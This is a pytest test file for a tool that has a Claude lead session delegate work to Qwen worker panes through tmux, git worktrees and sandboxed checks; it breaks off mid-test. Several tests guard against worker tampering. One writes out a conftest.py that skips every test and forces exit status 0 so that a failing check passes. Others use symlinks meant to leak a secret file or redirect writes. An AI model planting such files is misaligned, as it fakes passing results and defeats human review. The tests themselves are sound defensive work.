import hashlib
import json
import os
import pwd
import shutil
import sqlite3
import subprocess
import sys
import time
import uuid
from pathlib import Path

import pytest

import cli
import layout
import session


@pytest.fixture(autouse=True)
def _env(tmp_path, monkeypatch):
    monkeypatch.setattr(session, "STATE_DIR", tmp_path / "sessions")
    monkeypatch.setattr(session, "PROJECTS_DIR", tmp_path / "projects")
    monkeypatch.setenv("HOME", str(tmp_path / "home"))  # no ~/.claude/private.md
    monkeypatch.delenv("MATES_CLAUDE", raising=False)
    monkeypatch.delenv("MATES_LEAD", raising=False)
    oc = tmp_path / "oc"
    oc.mkdir()
    q = tmp_path / "qwen"
    q.write_text(f"#!/bin/sh\ncase $1 in opencode-dir) echo '{oc}' ;; warm) echo warm >> '{tmp_path}/warm.log' ;; esac\n")
    q.chmod(0o755)
    monkeypatch.setenv("MATES_QWEN", str(q))


def _oc_db(tmp_path, rows):
    db = sqlite3.connect(tmp_path / "oc" / "opencode.db")
    db.execute("CREATE TABLE session (id text PRIMARY KEY, project_id text NOT NULL, parent_id text, "
               "directory text NOT NULL, title text NOT NULL, time_created integer NOT NULL, "
               "time_updated integer NOT NULL)")
    for sid, directory in rows:
        db.execute("INSERT INTO session VALUES (?, 'p', NULL, ?, 't', 1, 1)", (sid, directory))
    db.commit()
    db.close()


def _transcript(root, sid, title):
    d = session.PROJECTS_DIR / session.repo_key(root)
    d.mkdir(parents=True, exist_ok=True)
    (d / f"{sid}.jsonl").write_text(json.dumps({"type": "custom-title", "customTitle": title}) + "\n")


def _wt(root, n):
    return f"{root}/.claude/worktrees/mates-qwen-{n}"


def _q(root, n, **kw):
    q = {"n": n, "worktree": _wt(root, n), "branch": f"mates/qwen-{n}", "opencode_session": None,
         "closed": False, "task": None}
    q.update(kw)
    return q


def _after(argv, flag):
    return argv[argv.index(flag) + 1]


def _root(tmp_path):
    r = tmp_path / "r"
    r.mkdir()
    return str(r)


def test_launch_plan_fresh(tmp_path):
    root = _root(tmp_path)
    plan = cli.launch_plan(None, root, False, [])
    argv = plan["claude_argv"]
    assert argv[:6] == ["env", "-u", "ANTHROPIC_API_KEY", "MATES_LEAD=1", f"MATES_ROOT={root}", "claude"]
    sid = _after(argv, "--session-id")
    assert str(uuid.UUID(sid)) == sid
    assert _after(argv, "-n") == "mates r"
    assert "--resume" not in argv
    prompt = _after(argv, "--append-system-prompt")
    assert "[from Claude]" in prompt and cli.ASK_SUFFIX in prompt and not prompt.endswith("\n")
    assert [(q["n"], q["worktree"]) for q in plan["qwens"]] == [(1, _wt(root, 1))]
    cmd = plan["qwens"][0]["cmd"]
    assert f"QWEN_ROOT={_wt(root, 1)}" in cmd and "QWEN_GIT_RO=1" in cmd and " -s " not in cmd
    assert plan["warnings"] == []
    st = plan["state"]
    assert st["claude_session"] == sid
    assert [(q["n"], q["closed"]) for q in st["qwens"]] == [(1, False)]


def test_fresh_closes_entries_above_one(tmp_path):
    root = _root(tmp_path)
    old = session.new_state(root)
    old["claude_session"] = "old-sid"
    _transcript(root, "old-sid", "mates r")
    old["qwens"] = [_q(root, 1, opencode_session="ses_1", task={"id": "t"}), _q(root, 2), _q(root, 3)]
    plan = cli.launch_plan(old, root, True, [])
    assert _after(plan["claude_argv"], "--session-id") != "old-sid"
    assert [q["n"] for q in plan["qwens"]] == [1]
    assert " -s " not in plan["qwens"][0]["cmd"]
    by_n = {q["n"]: q for q in plan["state"]["qwens"]}
    assert (by_n[1]["closed"], by_n[1]["opencode_session"], by_n[1]["task"]) == (False, None, None)
    assert by_n[2]["closed"] and by_n[3]["closed"]
    assert old["qwens"][1]["closed"] is False  # the input is not changed


def test_launch_plan_restore(tmp_path):
    root = _root(tmp_path)
    _transcript(root, "sid-1", "mates r")
    _oc_db(tmp_path, [("ses_1", _wt(root, 1)), ("ses_3", _wt(root, 3))])
    old = session.new_state(root)
    old["claude_session"] = "sid-1"
    old["widths"] = [{"pane": "lead", "pct": 50}, {"pane": 3, "pct": 25}, {"pane": 1, "pct": 25}]
    old["qwens"] = [_q(root, 1, opencode_session="ses_1"), _q(root, 2, closed=True),
                    _q(root, 3, opencode_session="ses_3")]
    plan = cli.launch_plan(old, root, False, [])
    argv = plan["claude_argv"]
    assert _after(argv, "--resume") == "sid-1" and "--session-id" not in argv
    assert [q["n"] for q in plan["qwens"]] == [3, 1]  # the saved left-to-right order
    assert plan["qwens"][0]["cmd"].count("-s ses_3") == 1 and "-s ses_1" in plan["qwens"][1]["cmd"]
    assert plan["warnings"] == []
    by_n = {q["n"]: q for q in plan["state"]["qwens"]}
    assert by_n[2]["closed"] and not by_n[1]["closed"] and not by_n[3]["closed"]


def test_restore_prefers_newest_titled_transcript(tmp_path):
    root = _root(tmp_path)
    _transcript(root, "after-clear", "mates r")  # /clear made a new transcript with the same title
    old = session.new_state(root)
    old["claude_session"] = "before-clear"
    old["qwens"] = [_q(root, 1)]
    plan = cli.launch_plan(old, root, False, [])
    assert _after(plan["claude_argv"], "--resume") == "after-clear"
    assert plan["state"]["claude_session"] == "after-clear"


def test_restore_missing_session_fresh(tmp_path):
    root = _root(tmp_path)
    _oc_db(tmp_path, [("ses_2", _wt(root, 2))])
    old = session.new_state(root)
    old["claude_session"] = "gone-sid"
    old["qwens"] = [_q(root, 1, opencode_session="ses_gone"), _q(root, 2, opencode_session="ses_2")]
    plan = cli.launch_plan(old, root, False, [])
    argv = plan["claude_argv"]
    assert "--resume" not in argv and _after(argv, "--session-id") != "gone-sid"
    cmds = {q["n"]: q["cmd"] for q in plan["qwens"]}
    assert " -s " not in cmds[1] and "-s ses_2" in cmds[2]
    assert len(plan["warnings"]) == 2
    assert any("gone-sid" in w for w in plan["warnings"])
    assert any("ses_gone" in w and "pane 1" in w for w in plan["warnings"])
    assert {q["n"]: q["opencode_session"] for q in plan["state"]["qwens"]} == {1: None, 2: "ses_2"}


def test_launch_plan_passes_claude_args(tmp_path):
    plan = cli.launch_plan(None, _root(tmp_path), False, ["--model", "x"])
    assert plan["claude_argv"][-2:] == ["--model", "x"]


def test_launch_plan_runtime_reaches_every_pane(tmp_path):
    root = _root(tmp_path)
    plan = cli.launch_plan(None, root, False, [], runtime_dir="/srv/rt/abc")
    assert "QWEN_RUNTIME=/srv/rt/abc" in plan["qwens"][0]["cmd"]
    assert plan["state"]["runtime"] == "/srv/rt/abc"


def test_private_md_appended_when_readable(tmp_path):
    p = tmp_path / "home" / ".claude" / "private.md"
    p.parent.mkdir(parents=True)
    p.write_text("PRIVATE-NOTE\n")
    plan = cli.launch_plan(None, _root(tmp_path), False, [])
    assert _after(plan["claude_argv"], "--append-system-prompt").endswith("PRIVATE-NOTE")


def test_subcommand_refused_without_lead_env(capsys, tmp_path, monkeypatch):
    monkeypatch.setattr(cli, "LOG", tmp_path / "no-log.jsonl")
    with pytest.raises(SystemExit) as e:
        cli.main(["send", "1", "--reason", "r", "do it"])
    assert e.value.code != 0
    assert "MATES_LEAD" in capsys.readouterr().err
    root = tmp_path / "r"
    root.mkdir()
    monkeypatch.setenv("MATES_ROOT", str(root))
    session.save(str(root.resolve()), session.new_state(str(root.resolve())))
    for open_cmd in ("list", "log", "retro"):
        try:
            code = cli.main([open_cmd])
        except SystemExit as e:
            code = e.code
        err = capsys.readouterr().err
        assert "MATES_LEAD" not in err
        if open_cmd != "retro":  # retro comes with Task 8
            assert code == 0, err


# --- launch against a stub tmux and a real repo ---------------------------------------

def _git(cwd, *args):
    return subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()


def _repo(path):
    path.mkdir(parents=True)
    _git(path, "init", "-q", "-b", "main")
    _git(path, "config", "user.email", "t@t")
    _git(path, "config", "user.name", "t")
    (path / "a.txt").write_text("a\n")
    _git(path, "add", "a.txt")
    _git(path, "commit", "-q", "-m", "init")
    return path


def _stub_tmux(tmp_path, monkeypatch):
    log = tmp_path / "tmux.log"
    p = tmp_path / "tmux"
    p.write_text(f"""#!/bin/sh
printf '%s\\n' "$*" >> '{log}'
case $1 in
  split-window) n=$(cat '{tmp_path}/n' 2>/dev/null || echo 1); echo $((n + 1)) > '{tmp_path}/n'; echo "%$n" ;;
  list-panes) ;;
esac
exit 0
""")
    p.chmod(0o755)
    monkeypatch.setattr(layout, "TMUX", str(p))
    return log


def test_fresh_keeps_worktrees(tmp_path, monkeypatch, capsysbinary):
    root = _repo(tmp_path / "repo")
    log = _stub_tmux(tmp_path, monkeypatch)
    for n in (1, 2):
        session.ensure_worktree(root, n)
    wt1, wt2 = root / ".claude/worktrees/mates-qwen-1", root / ".claude/worktrees/mates-qwen-2"
    (wt2 / "a.txt").write_text("qwen's work\n")
    (wt2 / "new.py").write_text("x = 1\n")
    (wt1 / ".mates").mkdir()
    (wt1 / ".mates" / "done.md").write_text("done\n")  # protocol files are not work
    old = session.new_state(str(root))
    old["qwens"] = [_q(str(root), 1), _q(str(root), 2)]
    session.save(str(root), old)
    monkeypatch.chdir(root)
    monkeypatch.setenv("TMUX_PANE", "%0")

    assert cli.worktree_dirty(str(root), 1) == []
    assert sorted(cli.worktree_dirty(str(root), 2)) == ["a.txt", "new.py"]

    assert cli.main(["launch", "--fresh"]) == 0
    out = capsysbinary.readouterr()
    err = out.err.decode()
    assert "mates-qwen-2" in err and "a.txt" in err and "new.py" in err
    assert "mates-qwen-1" not in err
    assert (wt2 / "a.txt").read_text() == "qwen's work\n" and (wt2 / "new.py").exists()
    argv = out.out.split(b"\0")
    assert argv[-1] == b"" and argv[0] == b"env" and b"--session-id" in argv
    st = session.load(str(root))
    assert {q["n"]: q["closed"] for q in st["qwens"]} == {1: False, 2: True}
    calls = log.read_text()
    assert "split-window -h -P -F #{pane_id} -t %0 -l 50%" in calls
    assert f"QWEN_ROOT={wt1}" in calls
    assert "wait-for -S mates-go-%1" in calls
    assert f"set-option -p -t %1 @mates {session.repo_key(str(root))}:1" in calls
    assert f"set-option -p -t %0 @mates {session.repo_key(str(root))}:lead" in calls
    assert f"set-option -w -t %0 @mates-window {session.repo_key(str(root))}" in calls


def test_restore_reapplies_widths(tmp_path, monkeypatch, capsysbinary):
    root = _repo(tmp_path / "repo")
    log = _stub_tmux(tmp_path, monkeypatch)
    old = session.new_state(str(root))
    old["widths"] = [{"pane": "lead", "pct": 40}, {"pane": 2, "pct": 30}, {"pane": 1, "pct": 30}]
    old["qwens"] = [_q(str(root), 1), _q(str(root), 2)]
    session.save(str(root), old)
    monkeypatch.chdir(root)
    monkeypatch.setenv("TMUX_PANE", "%0")
    assert cli.main(["launch"]) == 0
    calls = log.read_text().splitlines()
    splits = [c for c in calls if c.startswith("split-window")]
    assert "mates-qwen-2" in splits[0] and "-t %0 -l 50%" in splits[0]  # saved order: 2 then 1
    assert "mates-qwen-1" in splits[1] and "-t %1 " in splits[1]
    assert [c for c in calls if c.startswith("resize-pane")] == ["resize-pane -t %0 -x 40%", "resize-pane -t %1 -x 30%"]


def test_qwen_cmd_marks_live_while_qwen_runs():
    script = cli.qwen_cmd("/r/.claude/worktrees/mates-qwen-1", root="/r")
    on, off = f"{cli.QWEN_LIVE} 1", f"-u -t \"$TMUX_PANE\" {cli.QWEN_LIVE}"
    assert script.index(on) < script.index("QWEN_ROOT=") < script.index("rc=$?") < script.index(off) \
        < script.index("@mates-failed 1")


# --- delegation: send, wait, answer, check, diff, sync, merge, discard ---------------------
# A real repo with Qwen worktree 1, a stub tmux whose answers come from files, a stub
# `qwen` whose `exec` records how it was called and runs the command (no sandbox), and an
# OpenCode DB with the session/message/part columns Task 0 recorded.

class Mates:
    def __init__(self, tmp_path, monkeypatch, capsys, private):
        self.t, self.capsys = tmp_path, capsys
        self.private = private  # XDG_STATE_HOME: check snapshots go to <it>/mates/checks
        monkeypatch.setenv("XDG_STATE_HOME", str(private))
        self.root = _repo(tmp_path / "repo")
        self.key = session.repo_key(str(self.root))
        self.oc = tmp_path / "oc"
        self.db = self.oc / "opencode.db"
        con = sqlite3.connect(self.db)
        con.executescript("""
            CREATE TABLE session (id text PRIMARY KEY, project_id text NOT NULL, parent_id text,
                directory text NOT NULL, title text NOT NULL, time_created integer NOT NULL,
                time_updated integer NOT NULL);
            CREATE TABLE message (id text PRIMARY KEY, session_id text NOT NULL,
                time_created integer NOT NULL, time_updated integer NOT NULL, data text NOT NULL);
            CREATE TABLE part (id text PRIMARY KEY, message_id text NOT NULL, session_id text NOT NULL,
                time_created integer NOT NULL, time_updated integer NOT NULL, data text NOT NULL);
        """)
        con.close()
        tm = tmp_path / "tmux"
        tm.write_text(f"""#!/bin/sh
T='{tmp_path}'
printf '%s\\n' "$*" >> "$T/tmux.log"
[ -x "$T/on-any" ] && "$T/on-any"
case $1 in
  list-panes) case "$*" in *window_width*) cat "$T/widths" 2>/dev/null ;; *) cat "$T/panes" 2>/dev/null ;; esac ;;
  split-window) [ -f "$T/noroom" ] && {{ echo "no space for new pane" >&2; exit 1; }}; cat "$T/split-id" ;;
  kill-pane) sed -i "/^$3\t/d" "$T/panes" ;;
  display) cat "$T/live" 2>/dev/null ;;
  capture-pane) cat "$T/capture" 2>/dev/null ;;
  load-buffer) {{ cat; printf '\\n<<END>>\\n'; }} >> "$T/buffers" ;;
  send-keys) [ -x "$T/on-enter" ] && "$T/on-enter" ;;
esac
exit 0
""")
        tm.chmod(0o755)
        monkeypatch.setattr(layout, "TMUX", str(tm))
        q = tmp_path / "qwen-stub"
        q.write_text(f"""#!/bin/sh
case $1 in
  opencode-dir) echo '{self.oc}' ;;
  host) [ -f '{tmp_path}/host' ] || exit 1; cat '{tmp_path}/host' ;;
  exec) shift; [ "$1" = -- ] && shift
        printf '%s|%s|%s|%s|%s|%s\\n' "$PWD" "${{QWEN_ROOT:-}}" "${{QWEN_GIT_RO:-}}" "${{QWEN_RUNTIME:-}}" "${{QWEN_CHECK_DIR:-}}" "$*" >> '{tmp_path}/exec.log'
        cd "${{QWEN_CHECK_DIR:?}}" && exec "$@" ;;
esac
""")
        q.chmod(0o755)
        monkeypatch.setenv("MATES_QWEN", str(q))
        monkeypatch.setenv("MATES_LEAD", "1")
        monkeypatch.setenv("MATES_ROOT", str(self.root))
        monkeypatch.setattr(cli, "LOG", tmp_path / "log.jsonl")
        monkeypatch.setattr(cli, "SESSION_WAIT_S", 0.3)
        monkeypatch.setattr(cli, "SESSION_POLL_S", 0.05)
        monkeypatch.setattr(cli, "WAIT_POLL_S", 0.05)
        self.wt = session.ensure_worktree(self.root, 1)[0]
        st = session.new_state(str(self.root))
        st["qwens"] = [_q(str(self.root), 1)]
        session.save(str(self.root), st)
        self.pane("%1", 1)
        self.live(True)
        self.input("┃  Ask anything… \"Fix a TODO in the codebase\"\n")

    # tmux answers
    def pane(self, pid, n, failed=False):
        with open(self.t / "panes", "a") as f:
            f.write(f"{pid}\t{self.key}:{n}\t{'1' if failed else ''}\n")

    def no_panes(self):
        (self.t / "panes").write_text("")

    def lead_pane(self, pid="%0"):
        with open(self.t / "panes", "a") as f:
            f.write(f"{pid}\t{self.key}:lead\t\n")

    def live(self, on):
        (self.t / "live").write_text("1\n" if on else "\n")

    def input(self, text):
        (self.t / "capture").write_text("some reply\n" * 30 + text)

    def tmux_calls(self):
        p = self.t / "tmux.log"
        return p.read_text().splitlines() if p.exists() else []

    def buffers(self):
        p = self.t / "buffers"
        return p.read_text().split("\n<<END>>\n")[:-1] if p.exists() else []

    # OpenCode DB
    def ses(self, sid, updated_s=None, directory=None):
        con = sqlite3.connect(self.db)
        ms = int((updated_s or time.time()) * 1000)
        con.execute("INSERT INTO session VALUES (?, 'p', NULL, ?, 't', ?, ?)",
                    (sid, str(directory or self.wt), ms, ms))
        con.commit()
        con.close()

    def msg(self, sid, role, created_s, completed_s=None, finish=None, tokens=None):
        data = {"role": role, "time": {"created": int(created_s * 1000)}}
        if tokens:
            data["tokens"] = {"input": tokens[0], "output": tokens[1], "reasoning": 0,
                              "cache": {"read": 7, "write": 0}}
        if completed_s is not None:
            data["time"]["completed"] = int(completed_s * 1000)
        if finish:
            data["finish"] = finish
        up = int((completed_s or created_s) * 1000)
        con = sqlite3.connect(self.db)
        con.execute("INSERT INTO message VALUES (?, ?, ?, ?, ?)",
                    (uuid.uuid4().hex, sid, int(created_s * 1000), up, json.dumps(data)))
        con.commit()
        con.close()

    def on_enter_creates_session(self, sid):
        """OpenCode stand-in: the session row appears when the [from Claude] message is entered."""
        p = self.t / "on-enter"
        p.write_text(f"""#!/usr/bin/env python3
import sqlite3, time
if "[from Claude]" in open('{self.t}/buffers').read():
    con = sqlite3.connect('{self.db}')
    ms = int(time.time() * 1000) + 5000
    con.execute("INSERT OR IGNORE INTO session VALUES ('{sid}', 'p', NULL, '{self.wt}', 't', ?, ?)", (ms, ms))
    con.commit()
""")
        p.chmod(0o755)

    # running commands
    def run(self, *argv):
        self.capsys.readouterr()
        try:
            code = cli.main([str(a) for a in argv])
        except SystemExit as e:
            code = e.code
        out = self.capsys.readouterr()
        return code, out.out, out.err

    def state(self):
        return session.load(str(self.root))

    def task(self, n=1):
        return next(q for q in self.state()["qwens"] if q["n"] == n)["task"]

    def git(self, *args, cwd=None):
        return _git(cwd or self.root, *args)

    def lead_commit(self, name, text):
        (self.root / name).write_text(text)
        self.git("add", name)
        self.git("commit", "-q", "-m", f"lead {name}")
        return self.git("rev-parse", "HEAD")

    def send(self, text="fix a.txt", *extra):
        code, out, err = self.run("send", 1, "--reason", "clear check", "--files", "a.txt", *extra, text)
        assert code == 0, err
        return out, err

    def log(self):
        p = self.t / "log.jsonl"
        return [json.loads(line) for line in p.read_text().splitlines()] if p.exists() else []


@pytest.fixture
def m(tmp_path, monkeypatch, capsys, private_dir):
    return Mates(tmp_path, monkeypatch, capsys, private_dir)


def test_send_pastes_prefixed_message(m):
    m.send("fix add() in a.txt", "--continue")
    calls = [c for c in m.tmux_calls() if c.split()[0] in ("load-buffer", "paste-buffer", "send-keys")]
    assert calls == ["load-buffer -b mates-1 -", "paste-buffer -p -d -b mates-1 -t %1", "send-keys -t %1 Enter"]
    assert m.buffers() == ["[from Claude] fix add() in a.txt\n" + cli.ASK_SUFFIX]
    t = m.task()
    assert (t["summary"], t["reason"], t["files"], t["attempts"]) == ("fix add() in a.txt", "clear check", ["a.txt"], 1)
    assert t["base"] == m.git("rev-parse", "HEAD") and not t["direct"]


def test_send_refuses_dirty_worktree(m):
    (m.wt / "a.txt").write_text("qwen's unmerged work\n")
    (m.wt / "new.py").write_text("x = 1\n")
    code, _, err = m.run("send", 1, "--reason", "r", "next task")
    assert code != 0 and "merge 1" in err and "discard 1" in err and "a.txt" in err
    assert (m.wt / "a.txt").read_text() == "qwen's unmerged work\n" and (m.wt / "new.py").exists()
    assert m.buffers() == [] and m.task() is None


def test_send_refuses_busy(m):
    m.ses("ses_1")
    m.msg("ses_1", "user", time.time())  # a message with no reply yet
    code, _, err = m.run("send", 1, "--reason", "r", "task")
    assert code != 0 and "busy" in err and m.buffers() == []


def test_send_refuses_second_open_task(m):
    session.ensure_worktree(m.root, 2)
    st = m.state()
    st["qwens"].append(_q(str(m.root), 2, task={"id": "other", "direct": False}))
    session.save(str(m.root), st)
    m.pane("%2", 2)
    code, _, err = m.run("send", 1, "--reason", "r", "task")
    assert code != 0 and "pane 2" in err and "parallel" in err and m.buffers() == []


def test_send_refuses_shell_pane(m):
    m.live(False)  # qwen is not running in the pane (the wrapper's shell, or OpenCode quit)
    code, _, err = m.run("send", 1, "--reason", "r", "task")
    assert code != 0 and cli.QWEN_LIVE in err and m.buffers() == []


def test_send_refuses_nonempty_input(m):
    m.input("┃  half a sentence Wai is typ\n")
    code, _, err = m.run("send", 1, "--reason", "r", "task")
    assert code != 0 and "input box" in err and m.buffers() == []


def test_send_refuses_missing_pane(m):
    m.no_panes()
    m.lead_pane()
    code, _, err = m.run("send", 1, "--reason", "r", "task")
    assert code != 0 and "gone" in err
    assert m.state()["qwens"][0]["closed"] is True and m.buffers() == []


def test_send_refuses_failed_pane(m):
    m.no_panes()
    m.pane("%1", 1, failed=True)
    code, _, err = m.run("send", 1, "--reason", "r", "task")
    assert code != 0 and "failed" in err and m.buffers() == []
    assert m.state()["qwens"][0]["closed"] is False


def test_send_rebases_clean_worktree(m):
    head = m.lead_commit("b.txt", "lead moved on\n")
    m.send()
    assert m.git("rev-parse", "HEAD", cwd=m.wt) == head
    assert m.git("rev-parse", "refs/heads/mates/qwen-1") == head
    assert (m.wt / "b.txt").read_text() == "lead moved on\n"
    assert m.task()["base"] == head
    assert cli.worktree_dirty(str(m.root), 1) == []


def test_send_starts_new_session(m):
    m.ses("ses_old", updated_s=time.time() - 100)
    m.on_enter_creates_session("ses_new")
    m.send()
    bufs = m.buffers()
    assert bufs[0] == "/new" and bufs[1].startswith("[from Claude] ")
    assert m.task()["opencode_session"] == "ses_new"
    assert m.state()["qwens"][0]["opencode_session"] == "ses_new"


def test_send_continue_keeps_session(m):
    m.ses("ses_old", updated_s=time.time() - 100)
    m.on_enter_creates_session("ses_new")
    m.send("more on that", "--continue")
    assert [b for b in m.buffers() if b == "/new"] == []
    assert m.task()["opencode_session"] == "ses_old"


def test_wait_finds_late_session_row(m):
    m.send()
    assert m.task()["opencode_session"] is None  # no row yet
    code, out, _ = m.run("wait", 1, "--timeout", "0.2")
    assert (code, out) == (1, "timeout\n")  # busy while the session is unknown
    now = time.time() + 1
    m.ses("ses_late", updated_s=now)
    m.msg("ses_late", "user", now)
    m.msg("ses_late", "assistant", now + 1, completed_s=now + 2, finish="stop")
    code, out, _ = m.run("wait", 1, "--timeout", "1")
    assert out == "idle\n"
    assert m.task()["opencode_session"] == "ses_late"


def test_send_reminds_after_two_attempts(m):
    _, err = m.send()
    assert "attempt" not in err
    _, err = m.send("fix a.txt, and this time keep the test")  # nothing changed: the same task, again
    assert "attempt 2" in err and "discard 1" in err
    assert m.task()["attempts"] == 2
    assert [r["outcome"] for r in m.log()] == ["sent-back"]


def test_wait_done(m):
    m.send()
    (m.wt / ".mates").mkdir(exist_ok=True)
    (m.wt / ".mates" / "done.md").write_text("a.txt: fixed\ntest status: passed\n" + "x" * 3000)
    code, out, _ = m.run("wait", 1, "--timeout", "1")
    assert code == 0 and out.startswith("done: a.txt: fixed\ntest status: passed\n")
    assert len(out) == len("done: ") + cli.TEXT_MAX + 1


def test_wait_question(m):
    m.send()
    (m.wt / ".mates").mkdir(exist_ok=True)
    (m.wt / ".mates" / "question.md").write_text("Which function?\n")
    assert m.run("wait", 1, "--timeout", "1")[1] == "question: Which function?\n"


def test_wait_refuses_linked_protocol_file(m):
    m.send()
    secret = m.t / "secret"
    secret.write_text("PRIVATE\n")
    (m.wt / ".mates").mkdir(exist_ok=True)
    (m.wt / ".mates" / "done.md").symlink_to(secret)
    code, out, err = m.run("wait", 1, "--timeout", "1")
    assert code != 0 and "PRIVATE" not in out + err


def test_wait_dead_pane(m):
    m.send()
    m.no_panes()
    m.lead_pane()
    assert m.run("wait", 1, "--timeout", "1")[1] == "dead\n"
    assert m.state()["qwens"][0]["closed"] is True


def test_wait_failed_pane(m):
    m.send()
    m.no_panes()
    m.pane("%1", 1, failed=True)
    assert m.run("wait", 1, "--timeout", "1")[1] == "failed\n"


def test_wait_idle(m):
    m.on_enter_creates_session("ses_1")
    m.send()
    t = m.task()["paste_ts"]
    m.msg("ses_1", "user", t + 0.5)
    m.msg("ses_1", "assistant", t + 1, completed_s=t + 2, finish="stop")
    assert m.run("wait", 1, "--timeout", "1")[1] == "idle\n"


def test_wait_not_idle_right_after_send(m):
    m.ses("ses_1", updated_s=time.time() - 50)
    m.msg("ses_1", "assistant", time.time() - 60, completed_s=time.time() - 50, finish="stop")  # the last reply
    m.send("next", "--continue")
    assert m.run("wait", 1, "--timeout", "0.2")[1] == "timeout\n"


def test_wait_timeout(m):
    m.on_enter_creates_session("ses_1")
    m.send()
    m.msg("ses_1", "user", time.time())
    t0 = time.time()
    code, out, _ = m.run("wait", 1, "--timeout", "0.3")
    assert (code, out) == (1, "timeout\n") and time.time() - t0 < 2


def test_answer_clears_stale_done(m):
    m.send()
    (m.wt / ".mates").mkdir(exist_ok=True)
    (m.wt / ".mates" / "question.md").write_text("Which function?\n")
    (m.wt / ".mates" / "done.md").write_text("stale\n")
    code, out, err = m.run("answer", 1, "add(), in a.txt")
    assert code == 0, err
    assert not (m.wt / ".mates" / "question.md").exists() and not (m.wt / ".mates" / "done.md").exists()
    assert m.buffers()[-1] == "[from Claude] add(), in a.txt\n" + cli.ASK_SUFFIX
    t = m.task()
    assert t["questions"] == [{"q": "Which function?", "a": "add(), in a.txt"}] and t["attempts"] == 1
    assert m.log() == []


def test_answer_sendback_counts_attempt(m):
    m.send()
    (m.wt / "a.txt").write_text("wrong\n")
    assert m.run("check", 1, "--", "true")[0] == 0
    assert m.run("diff", 1)[0] == 0
    assert m.task()["checked_tree"] and m.task()["diffed_tree"]
    code, _, err = m.run("answer", 1, "--sendback", "the result must be b")
    assert code == 0, err
    t = m.task()
    assert t["attempts"] == 2 and t["checked_tree"] is None and t["diffed_tree"] is None
    assert t["attempt_ts"] >= t["sent_ts"]
    (rec,) = m.log()
    assert (rec["outcome"], rec["attempts"], rec["pane"], rec["route"]) == ("sent-back", 1, 1, "qwen")
    assert "discard 1" in err


def test_diff_includes_untracked(m):
    m.send()
    (m.wt / "a.txt").write_text("b\n")
    (m.wt / "brand_new.py").write_text("y = 2\n")
    (m.wt / ".mates").mkdir(exist_ok=True)
    (m.wt / ".mates" / "done.md").write_text("done\n")
    code, out, _ = m.run("diff", 1)
    assert code == 0
    assert "+++ b/brand_new.py" in out and "+y = 2" in out and "+++ b/a.txt" in out
    assert "done.md" not in out
    assert "unnamed-file:brand_new.py" in out and "unnamed-file:a.txt" not in out
    t = m.task()
    assert t["diffed_tree"] == cli.snapshot(str(m.root), 1, t["base"])
    assert t["flags"] == ["unnamed-file:brand_new.py"]


def test_check_records_tree_and_runs_sandboxed(m):
    m.send()
    (m.wt / "a.txt").write_text("b\n")
    code, out, _ = m.run("check", 1, "--", "cat a.txt; echo ok")
    assert code == 0 and out.splitlines()[0].startswith("check exit 0") and out.splitlines()[-2:] == ["b", "ok"]
    t = m.task()
    tree = cli.snapshot(str(m.root), 1, t["base"])
    assert (t["checked_tree"], t["check_cmd"]) == (tree, "cat a.txt; echo ok")
    (line,) = (m.t / "exec.log").read_text().splitlines()
    cwd, qroot, ro, rt, chk, argv = line.split("|")
    checks = m.private / "mates" / "checks"
    assert cwd == "/" and Path(chk).parent == checks  # outside every worktree
    assert (qroot, ro, rt, argv) == ("", "", "", "sh -c cat a.txt; echo ok")
    assert list(checks.iterdir()) == []  # removed after the check


def test_check_failure_records_nothing(m):
    m.send()
    code, out, _ = m.run("check", 1, "--", "echo nope; exit 3")
    assert code == 3 and "check exit 3" in out and "nope" in out
    assert m.task()["checked_tree"] is None


def test_snapshot_survives_nested_repo_under_mates(m):
    """Final review Minor 1: `!.mates/` in a Qwen .gitignore plus a git repo at .mates/x/."""
    m.send()
    (m.wt / ".gitignore").write_text("!.mates/\n")
    nested = m.wt / ".mates" / "x"
    nested.mkdir(parents=True)
    _git(nested, "init", "-q")
    (nested / "f").write_text("x\n")
    _git(nested, "add", "f")
    _git(nested, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "x")
    code, out, err = m.run("diff", 1)
    assert code == 0, err
    assert ".mates/x" not in out and "Subproject" not in out


def test_check_refuses_busy(m):
    m.ses("ses_1")
    m.msg("ses_1", "user", time.time())
    code, _, err = m.run("check", 1, "--", "true")
    assert code != 0 and "busy" in err and not (m.t / "exec.log").exists()


def test_check_ignores_export_ignore(m):
    m.send()
    (m.wt / "b.txt").write_text("needed by the check\n")
    (m.wt / ".gitattributes").write_text("b.txt export-ignore\n")
    assert m.run("check", 1, "--", "test -f b.txt")[0] == 0


def test_check_runs_on_snapshot(m):
    m.send()
    (m.wt / "a.txt").write_text("b\n")
    assert m.run("check", 1, "--", "grep -qx b a.txt && echo made > made.txt && mkdir -p d && echo x > d/f "
                 "&& chmod a-w d")[0] == 0
    tree = m.task()["checked_tree"]
    assert not (m.wt / "made.txt").exists() and not (m.wt / "d").exists()
    assert not (m.wt / ".mates" / "check").exists()
    assert list((m.private / "mates" / "checks").iterdir()) == []  # a read-only folder is removed too
    assert cli.worktree_dirty(str(m.root), 1) == ["a.txt"]
    assert cli.snapshot(str(m.root), 1, m.task()["base"]) == tree


def test_check_ignores_qwen_config_in_parent_folders(m):
    """Final review I1: a Qwen-written .mates/pytest.ini + conftest.py (never in the
    snapshot or the diff) must not turn a failing check into a pass."""
    m.send()
    (m.wt / "test_x.py").write_text("def test_x():\n    assert False\n")
    mates = m.wt / ".mates"
    mates.mkdir(exist_ok=True)
    (mates / "pytest.ini").write_text("[pytest]\n")
    (mates / "conftest.py").write_text(
        "import pytest\n"
        "def pytest_collection_modifyitems(items):\n"
        "    for i in items:\n"
        "        i.add_marker(pytest.mark.skip)\n"
        "def pytest_sessionfinish(session, exitstatus):\n"
        "    session.exitstatus = 0\n")
    code, out, _ = m.run("check", 1, "--", f"{sys.executable} -m pytest -q -p no:cacheprovider test_x.py")
    assert code != 0, out
    assert m.task()["checked_tree"] is None


def test_check_never_writes_through_a_qwen_link(m):
    m.send()
    target = m.t / "elsewhere"
    target.mkdir()
    (target / "keep").write_text("keep\n")
    (m.wt / ".mates").mkdir(exist_ok=True)
    (m.wt / ".mates" / "check").symlink_to(target)
    assert m.run("check", 1, "--", "true")[0] == 0
    assert sorted(p.name for p in target.iterdir()) == ["keep"]


def test_check_refuses_shared_state_folder(m, monkeypatch):
    monkeypatch.setenv("XDG_STATE_HOME", str(m.t / "shared"))  # under /tmp: others can write there
    m.send()
    code, _, err = m.run("check", 1, "--", "true")
